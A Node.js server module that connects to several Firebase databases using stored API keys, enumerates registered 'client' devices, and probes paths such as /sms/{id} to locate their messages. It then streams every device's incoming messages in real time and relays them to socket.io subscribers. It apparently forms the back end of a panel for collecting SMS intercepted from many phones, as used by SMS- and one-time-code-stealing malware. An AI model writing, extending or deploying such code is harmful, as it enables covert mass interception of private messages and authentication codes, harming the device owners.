const mongoose = require('mongoose');
const { EventSource } = require('eventsource');
const axios = require('axios');
const Source = require('./models/Source');

const activeStreams = new Map(); // srcKey_deviceId -> EventSource
const activeSockets = new Map(); // socketId -> Set of srcKey_deviceId
let ioInstance = null;

async function syncFirebaseStreams() {
    try {
        const sources = await Source.find({ base: { $ne: null } });
        console.log(`[REALTIME] Starting sync for ${sources.length} sources...`);
        
        for (let src of sources) {
            const authSuffix = src.apiKey ? `?auth=${src.apiKey}&` : '?';
            
            // 1. Fetch all clients to establish message streams
            try {
                const clientsRes = await axios.get(`${src.base}/clients.json${authSuffix}shallow=true`);
                if (clientsRes.data && typeof clientsRes.data === 'object') {
                    const clientIds = Object.keys(clientsRes.data);
                    
                    // Probe schema using the first client to find where messages are actually stored
                    let schemaTemplate = '/messages/{id}.json';
                    if (clientIds.length > 0) {
                        const testId = clientIds[0];
                        const testPaths = [`/messages/${testId}.json`, `/clients/${testId}/messages.json`, `/sms/${testId}.json`, `/clients/${testId}/sms.json`];
                        for (let p of testPaths) {
                            try {
                                const authS = src.apiKey ? `?auth=${src.apiKey}&` : '?';
                                const probeRes = await axios.get(`${src.base}${p}${authS}shallow=true`);
                                if (probeRes.data) {
                                    schemaTemplate = p.replace(testId, '{id}');
                                    break;
                                }
                            } catch(e) {}
                        }
                    }
                    src.cachedSchema = schemaTemplate; // Save for periodic checks
                    
                    for (let id of clientIds) {
                        setupMessageStream(src, id, schemaTemplate);
                        // Stagger connections by 50ms to prevent CPU/Event Loop lockup on 0.1 CPU instance
                        await new Promise(r => setTimeout(r, 50));
                    }
                }
            } catch (e) {
                console.error(`[REALTIME] Failed to fetch clients for ${src.key}: ${e.message}`);
            }
            
            // 2. Setup a stream to /clients to catch NEW devices automatically
            setupClientListener(src);
        }
    } catch (e) {
        console.error(`[REALTIME] DB Sync Error:`, e.message);
    }
}

function setupClientListener(src) {
    const authSuffix = src.apiKey ? `?auth=${src.apiKey}&` : '?';
    // Limit to last 1 to avoid downloading the whole clients tree, just get new additions
    const url = `${src.base}/clients.json${authSuffix}`; 
    // Actually, listening to /clients might be heavy if devices update battery often.
    // A better approach is to periodically resync every 5 minutes.
    setInterval(async () => {
        try {
            const clientsRes = await axios.get(`${src.base}/clients.json${authSuffix}shallow=true`);
            if (clientsRes.data && typeof clientsRes.data === 'object') {
                const clientIds = Object.keys(clientsRes.data);
                for (let id of clientIds) {
                    if (!activeStreams.has(`${src.key}_${id}`)) {
                        setupMessageStream(src, id, src.cachedSchema || '/messages/{id}.json');
                        await new Promise(r => setTimeout(r, 50));
                    }
                }
            }
        } catch(e) {}
    }, 5 * 60 * 1000);
}

function setupMessageStream(src, id, schemaTemplate = '/messages/{id}.json') {
    const streamKey = `${src.key}_${id}`;
    if (activeStreams.has(streamKey)) return; // Already listening

    const authSuffix = src.apiKey ? `?auth=${src.apiKey}&` : '?';
    
    // Replace {id} placeholder with the actual client id
    const path = schemaTemplate.replace('{id}', id);
    
    // limitToLast=1 ensures we only get the latest message and future ones, not the whole history
    const url = `${src.base}${path}${authSuffix}orderBy="$key"&limitToLast=1`;

    const es = new EventSource(url);
    activeStreams.set(streamKey, es);

    es.addEventListener('put', async (e) => {
        try {
            const payload = JSON.parse(e.data);
            if (!payload || !payload.data) return;
            
            let messageObj = payload.data;
            let msgId = payload.path.replace('/', '');

            if (payload.path === '/') {
                // Initial load, payload.data is an object of { msgId: messageObj }
                const keys = Object.keys(payload.data);
                if (keys.length === 0) return;
                msgId = keys[keys.length - 1];
                messageObj = payload.data[msgId];
            }
            
            // It's a new message event!
            if (messageObj && messageObj.type === 'incoming') {
                const ts = messageObj.timestamp || messageObj.date || Date.now();
                
                // 1. Write lastMessageTime to Firebase clients node
                const patchAuth = src.apiKey ? `?auth=${src.apiKey}` : '';
                axios.patch(`${src.base}/clients/${id}.json${patchAuth}`, { lastMessageTime: ts }).catch(()=>{});
                
                // 2. Broadcast via Socket.io to anyone subscribed to this device
                if (ioInstance) {
                    ioInstance.to(streamKey).emit('newMessage', {
                        _localId: msgId,
                        ...messageObj
                    });
                }
            }
        } catch (err) {
            // parsing error
        }
    });

    es.addEventListener('error', () => {
        es.close();
        activeStreams.delete(streamKey);
        // Re-establish after 10 seconds if disconnected
        setTimeout(() => setupMessageStream(src, id), 10000);
    });
}

function init(io) {
    ioInstance = io;

    io.on('connection', (socket) => {
        activeSockets.set(socket.id, new Set());

        socket.on('subscribe', ({ srcKey, id }) => {
            const room = `${srcKey}_${id}`;
            socket.join(room);
            activeSockets.get(socket.id).add(room);
        });

        socket.on('unsubscribe', ({ srcKey, id }) => {
            const room = `${srcKey}_${id}`;
            socket.leave(room);
            activeSockets.get(socket.id).delete(room);
        });

        socket.on('disconnect', () => {
            activeSockets.delete(socket.id);
        });
    });

    // Wait for Mongoose to connect before syncing
    if (mongoose.connection.readyState === 1) {
        syncFirebaseStreams();
    } else {
        mongoose.connection.on('open', syncFirebaseStreams);
    }
}

module.exports = { init };
